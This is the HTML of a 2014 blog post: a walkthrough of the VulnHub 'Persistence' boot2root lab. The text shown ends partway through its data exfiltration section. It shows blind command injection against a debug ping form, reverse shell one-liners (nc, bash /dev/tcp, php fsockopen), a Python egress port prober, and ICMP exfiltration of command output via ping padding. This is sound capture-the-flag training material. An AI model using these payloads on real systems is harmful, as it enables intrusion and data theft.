@@ -1,0 +1,1230 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> From Persistence | #!/slash/note</title>
+  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="From Persistence" />
+<meta property="og:description" content="persist we must!
+Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.
+This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://leonjza.github.io/posts/2014-09-18-from-persistence/" />
+<meta property="article:published_time" content="2014-09-18T06:58:53+00:00" />
+<meta property="article:modified_time" content="2014-09-18T06:58:53+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="From Persistence"/>
+<meta name="twitter:description" content="persist we must!
+Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.
+This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!"/>
+
+  
+  
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+
+  
+  
+  
+  
+  
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-44457032-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://leonjza.github.io/posts/2014-08-17-kali-linux-oracle-support/">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://leonjza.github.io/posts/2014-10-10-another-troll-tamed-solving-troll-2/">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&text=From%20Persistence">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&is_video=false&description=From%20Persistence">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=From%20Persistence&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-digg " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&name=From%20Persistence&description=%3ch2%20id%3d%22persist-we-must%22%3epersist%20we%20must%21%3c%2fh2%3e%0a%3cp%3ePersistence%21%20A%20new%20boot2root%20hosted%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e%2c%20authored%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fsuperkojiman%22%3e%40superkojiman%3c%2fa%3e%20and%20sagi-%20definitely%20got%20the%20attention%20from%20the%20community%20it%20deserves%21%20Persistence%20was%20actually%20part%20of%20a%20%3ca%20href%3d%22http%3a%2f%2fblog.vulnhub.com%2f2014%2f09%2fcompetition-persistence.html%22%3ewriteup%20competition%3c%2fa%3e%20launched%20on%20September%20the%207th%2c%20and%20ran%20up%20until%20October%20th%205th.%3c%2fp%3e%0a%3cp%3eThis%20is%20my%20experience%20while%20trying%20to%20complete%20the%20challenge.%20Persistence%2c%20once%20again%2c%20challenged%20me%20to%20learn%20about%20things%20that%20would%20normally%20have%20me%20just%20go%20%26ldquo%3bmeh%2c%20next%26rdquo%3b.%20As%20expected%2c%20this%20post%20is%20also%20a%20very%20big%20spoiler%20if%20you%20have%20not%20completed%20it%20yourself%20yet%2c%20so%20be%20warned%21%3c%2fp%3e">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&t=From%20Persistence">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#persist-we-must">persist we must!</a></li>
+    <li><a href="#lets-get-our-hands-dirty">lets get our hands dirty</a></li>
+    <li><a href="#finding-that-debugger">finding that (de)bugger</a></li>
+    <li><a href="#blind-command-injection">blind command injection</a></li>
+    <li><a href="#blind-command-injection---file-enumeration">blind command injection - file enumeration</a></li>
+    <li><a href="#blind-command-injection---port-scanner">blind command injection - port scanner</a></li>
+    <li><a href="#data-exfiltration">data exfiltration</a></li>
+    <li><a href="#sysadmin-tool">sysadmin-tool</a></li>
+    <li><a href="#shell-and-breakout-as-avida">shell and breakout as avida</a></li>
+    <li><a href="#the-wopr-game">the wopr game</a></li>
+    <li><a href="#wopr-stack-smashing">wopr, stack smashing</a></li>
+    <li><a href="#wopr---stack-canary-bruteforce">wopr - stack canary bruteforce</a></li>
+    <li><a href="#wopr---nx-and-eip">wopr - NX and EIP</a></li>
+    <li><a href="#wopr---code-exec">wopr - code exec</a></li>
+    <li><a href="#wopr---the-exploit">wopr - the exploit</a></li>
+    <li><a href="#conclusion">conclusion</a></li>
+    <li><a href="#thats-not-all">thats not all</a></li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        From Persistence
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2014-09-18 06:58:53 &#43;0000 UTC" itemprop="datePublished">2014-09-18</time>
+          
+        </div>
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
+            
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <h2 id="persist-we-must">persist we must!</h2>
+<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>
+<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>
+<h2 id="lets-get-our-hands-dirty">lets get our hands dirty</h2>
+<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>
+<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap 192.168.56.104 --reason -sV -p-
+
+Starting Nmap 6.46 <span style="color:#ff79c6">(</span> http://nmap.org <span style="color:#ff79c6">)</span> at 2014-09-18 07:01 SAST
+Nmap scan report <span style="color:#ff79c6">for</span> 192.168.56.104
+Host is up, received reset <span style="color:#ff79c6">(</span>0.0037s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">65534</span> filtered ports
+Reason: <span style="color:#bd93f9">65534</span> no-responses
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack nginx 1.4.7
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 4131.90 seconds
+</code></pre></div><p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>
+<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>
+<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl -v 192.168.56.104/index.php
+* About to connect<span style="color:#ff79c6">()</span> to 192.168.56.104 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
+*   Trying 192.168.56.104...
+* connected
+* Connected to 192.168.56.104 <span style="color:#ff79c6">(</span>192.168.56.104<span style="color:#ff79c6">)</span> port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span><span style="color:#6272a4">#0)</span>
+&gt; GET /index.php HTTP/1.1
+&gt; User-Agent: curl/7.26.0
+&gt; Host: 192.168.56.104
+&gt; Accept: */*
+
+* additional stuff not fine transfer.c:1037: <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">0</span>
+* HTTP 1.1 or later with persistent connection, pipelining supported
+&lt; HTTP/1.1 <span style="color:#bd93f9">404</span> Not Found
+&lt; Server: nginx/1.4.7
+&lt; Date: Thu, <span style="color:#bd93f9">18</span> Sep <span style="color:#bd93f9">2014</span> 07:28:18 GMT
+&lt; Content-Type: text/html
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; X-Powered-By: PHP/5.3.3
+
+No input file specified.
+
+* Connection <span style="color:#6272a4">#0 to host 192.168.56.104 left intact</span>
+* Closing connection <span style="color:#6272a4">#0</span>
+</code></pre></div><p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>
+<h2 id="finding-that-debugger">finding that (de)bugger</h2>
+<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>
+<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc <span style="color:#bd93f9">404</span> http://192.168.56.104/FUZZ.php
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.56.104/FUZZ.php
+Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
+
+Total requests: <span style="color:#8be9fd;font-style:italic">1660</span>
+<span style="color:#ff79c6">==================================================================</span>
+ID  Response   Lines      Word         Chars          <span style="color:#8be9fd;font-style:italic">Request</span>
+<span style="color:#ff79c6">==================================================================</span>
+
+00434:  <span style="color:#8be9fd;font-style:italic">C</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">200</span>     <span style="color:#bd93f9">12</span> L        <span style="color:#bd93f9">28</span> W      <span style="color:#bd93f9">357</span> Ch    <span style="color:#f1fa8c">&#34; - debug&#34;</span>
+</code></pre></div><p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to http://192.168.56.101/debug.php showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>
+<figure>
+    <img src="https://leonjza.github.io/images/persistence_debug_php.png"/> 
+</figure>
+
+<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>
+<h2 id="blind-command-injection">blind command injection</h2>
+<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# tcpdump icmp
+tcpdump: verbose output suppressed, use -v or -vv <span style="color:#ff79c6">for</span> full protocol decode
+listening on eth0, link-type EN10MB <span style="color:#ff79c6">(</span>Ethernet<span style="color:#ff79c6">)</span>, capture size <span style="color:#bd93f9">65535</span> bytes
+07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 64004, seq 1, length <span style="color:#bd93f9">64</span>
+07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 64004, seq 1, length <span style="color:#bd93f9">64</span>
+07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 64004, seq 2, length <span style="color:#bd93f9">64</span>
+07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 64004, seq 2, length <span style="color:#bd93f9">64</span>
+07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 64004, seq 3, length <span style="color:#bd93f9">64</span>
+07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 64004, seq 3, length <span style="color:#bd93f9">64</span>
+07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 64004, seq 4, length <span style="color:#bd93f9">64</span>
+07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 64004, seq 4, length <span style="color:#bd93f9">64</span>
+</code></pre></div><p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>
+<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>
+<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>
+<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>
+<h2 id="blind-command-injection---file-enumeration">blind command injection - file enumeration</h2>
+<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>
+<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">;<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> -f /bin/sh <span style="color:#ff79c6">]</span> ; <span style="color:#ff79c6">then</span> ping 192.168.56.102 -c <span style="color:#bd93f9">1</span> ; <span style="color:#ff79c6">else</span> ping 192.168.56.102 -c <span style="color:#bd93f9">2</span> ; <span style="color:#ff79c6">fi</span>
+</code></pre></div><p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# tcpdump icmp
+tcpdump: verbose output suppressed, use -v or -vv <span style="color:#ff79c6">for</span> full protocol decode
+listening on eth0, link-type EN10MB <span style="color:#ff79c6">(</span>Ethernet<span style="color:#ff79c6">)</span>, capture size <span style="color:#bd93f9">65535</span> bytes
+08:15:53.557994 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 63493, seq 1, length <span style="color:#bd93f9">64</span>
+08:15:53.558011 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 63493, seq 1, length <span style="color:#bd93f9">64</span>
+
+</code></pre></div><p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>
+<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>
+<h2 id="blind-command-injection---port-scanner">blind command injection - port scanner</h2>
+<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>
+<p>No. Luck.</p>
+<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> socket
+<span style="color:#ff79c6">for</span> port <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">xrange</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">65535</span>):
+    sock <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+    sock<span style="color:#ff79c6">.</span>settimeout(<span style="color:#bd93f9">0.1</span>)
+    sock<span style="color:#ff79c6">.</span>connect_ex((<span style="color:#f1fa8c">&#34;192.168.56.102&#34;</span>, port))
+    sock<span style="color:#ff79c6">.</span>close()
+</code></pre></div><p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>
+<h2 id="data-exfiltration">data exfiltration</h2>
+<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>
+<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>
+<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-p pattern
+   You may specify up to <span style="color:#bd93f9">16</span> <span style="color:#f1fa8c">``</span>pad<span style="color:#f1fa8c">&#39;&#39;</span> bytes to fill out the packet you send.
+   This is useful <span style="color:#ff79c6">for</span> diagnosing data-dependent problems in a network.
+   For example, <span style="color:#f1fa8c">``</span>-p ff<span style="color:#f1fa8c">&#39;&#39;</span> will cause the sent packet to be filled with all ones.
+</code></pre></div><p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>
+<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">;id| xxd -p -c <span style="color:#bd93f9">16</span> | <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">read</span> line; <span style="color:#ff79c6">do</span> ping -p <span style="color:#8be9fd;font-style:italic">$line</span> -c <span style="color:#bd93f9">1</span> -q 192.168.56.102; <span style="color:#ff79c6">done</span>
+</code></pre></div><p>On the <code>tcpdump</code> side of things&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop# tcpdump icmp -X
+tcpdump: verbose output suppressed, use -v or -vv <span style="color:#ff79c6">for</span> full protocol decode
+listening on eth0, link-type EN10MB <span style="color:#ff79c6">(</span>Ethernet<span style="color:#ff79c6">)</span>, capture size <span style="color:#bd93f9">65535</span> bytes
+09:18:14.439222 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 6920, seq 1, length <span style="color:#bd93f9">64</span>
+    0x0000:  <span style="color:#bd93f9">4500</span> <span style="color:#bd93f9">0054</span> <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">4000</span> <span style="color:#bd93f9">4001</span> 488a c0a8 <span style="color:#bd93f9">3868</span>  E..T..@.@.H...8h
+    0x0010:  c0a8 <span style="color:#bd93f9">3866</span> <span style="color:#bd93f9">0800</span> 4b5b 1b08 <span style="color:#bd93f9">0001</span> 56a3 1a54  ..8f..K<span style="color:#ff79c6">[</span>....V..T
+    0x0020:  f357 0a00 6e67 696e <span style="color:#bd93f9">7829</span> <span style="color:#bd93f9">2067</span> <span style="color:#bd93f9">7569</span> 643d  .W..nginx<span style="color:#ff79c6">)</span>.guid<span style="color:#ff79c6">=</span>
+    0x0030:  <span style="color:#bd93f9">3439</span> <span style="color:#bd93f9">3828</span> 6e67 696e <span style="color:#bd93f9">7829</span> <span style="color:#bd93f9">2067</span> <span style="color:#bd93f9">7569</span> 643d  498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.guid<span style="color:#ff79c6">=</span>
+    0x0040:  <span style="color:#bd93f9">3439</span> <span style="color:#bd93f9">3828</span> 6e67 696e <span style="color:#bd93f9">7829</span> <span style="color:#bd93f9">2067</span> <span style="color:#bd93f9">7569</span> 643d  498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.guid<span style="color:#ff79c6">=</span>
+    0x0050:  <span style="color:#bd93f9">3439</span> <span style="color:#bd93f9">3828</span>                                498<span style="color:#ff79c6">(</span>
+09:18:14.439248 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 6920, seq 1, length <span style="color:#bd93f9">64</span>
+    0x0000:  <span style="color:#bd93f9">4500</span> <span style="color:#bd93f9">0054</span> a049 <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">4001</span> e840 c0a8 <span style="color:#bd93f9">3866</span>  E..T.I..@..@..8f
+    0x0010:  c0a8 <span style="color:#bd93f9">3868</span> <span style="color:#bd93f9">0000</span> 535b 1b08 <span style="color:#bd93f9">0001</span> 56a3 1a54  ..8h..S<span style="color:#ff79c6">[</span>....V..T
+    0x0020:  f357 0a00 6e67 696e <span style="color:#bd93f9">7829</span> <span style="color:#bd93f9">2067</span> <span style="color:#bd93f9">7569</span> 643d  .W..nginx<span style="color:#ff79c6">)</span>.guid<span style="color:#ff79c6">=</span>
+    0x0030:  <span style="color:#bd93f9">3439</span> <span style="color:#bd93f9">3828</span> 6e67 696e <span style="color:#bd93f9">7829</span> <span style="color:#bd93f9">2067</span> <span style="color:#bd93f9">7569</span> 643d  498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.guid<span style="color:#ff79c6">=</span>
